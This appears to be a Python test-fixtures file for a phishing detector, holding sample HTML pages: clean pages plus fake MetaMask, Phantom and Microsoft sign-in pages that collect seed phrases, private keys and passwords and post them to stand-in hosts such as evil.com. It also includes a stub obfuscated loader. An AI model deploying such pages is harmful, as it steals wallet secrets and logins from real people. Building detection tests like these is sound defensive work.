"""Shared HTML fixtures for tests."""

CLEAN_HTML = """<!DOCTYPE html>
<html>
<head><title>My Arweave Blog Post</title></head>
<body>
  <h1>Welcome to my blog</h1>
  <p>This is a legitimate blog post stored on Arweave.</p>
  <p>Decentralized storage is the future of the web.</p>
</body>
</html>"""

SEED_PHRASE_PHISHING = """<!DOCTYPE html>
<html>
<head><title>MetaMask - Restore Wallet</title></head>
<body>
  <h1>MetaMask</h1>
  <h2>Enter your recovery phrase</h2>
  <p>Enter your 12-word seed phrase to restore your wallet.</p>
  <form action="https://evil.com/steal" method="POST">
    <input type="text" name="word1" placeholder="Word #1">
    <input type="text" name="word2" placeholder="Word #2">
    <input type="text" name="word3" placeholder="Word #3">
    <input type="text" name="word4" placeholder="Word #4">
    <input type="text" name="word5" placeholder="Word #5">
    <input type="text" name="word6" placeholder="Word #6">
    <input type="text" name="word7" placeholder="Word #7">
    <input type="text" name="word8" placeholder="Word #8">
    <input type="text" name="word9" placeholder="Word #9">
    <input type="text" name="word10" placeholder="Word #10">
    <input type="text" name="word11" placeholder="Word #11">
    <input type="text" name="word12" placeholder="Word #12">
    <button type="submit">Restore Wallet</button>
  </form>
</body>
</html>"""

EXTERNAL_FORM_PHISHING = """<!DOCTYPE html>
<html>
<head><title>Sign In</title></head>
<body>
  <h1>Login</h1>
  <form action="https://evil-collector.com/creds" method="POST">
    <input type="text" name="email" placeholder="Email">
    <input type="password" name="password" placeholder="Password">
    <button type="submit">Sign In</button>
  </form>
</body>
</html>"""

WALLET_IMPERSONATION_PHISHING = """<!DOCTYPE html>
<html>
<head><title>Phantom Wallet</title></head>
<body>
  <h1>Phantom</h1>
  <p>Import wallet using your secret recovery phrase</p>
  <form>
    <input type="password" name="key" placeholder="Enter private key">
    <button type="submit">Import</button>
  </form>
</body>
</html>"""

OBFUSCATED_LOADER_PHISHING = """<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
<script>
var encoded = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB";
document.write(atob(encoded));
</script>
</body>
</html>"""

NOT_HTML_CONTENT = b'{"name": "some json file", "value": 42}'

MINIMAL_HTML = """<html><body><p>Hello world</p></body></html>"""

MICROSOFT_PHISHING = """<!DOCTYPE html>
<html>
<head><title>Sign-In</title></head>
<body>
  <div class="MSLogo">
    <img src="logo.png" alt="Microsoft">
  </div>
  <h1>Sign In</h1>
  <p>Please wait...</p>
  <form action="https://coingrok.com/collect" method="POST">
    <input type="text" name="email" placeholder="Email">
    <input type="password" id="password" placeholder="Password">
    <button>Next</button>
  </form>
  <script>
    document.write(unescape('%3Cscript%3Ealert(1)%3C/script%3E'));
  </script>
</body>
</html>"""
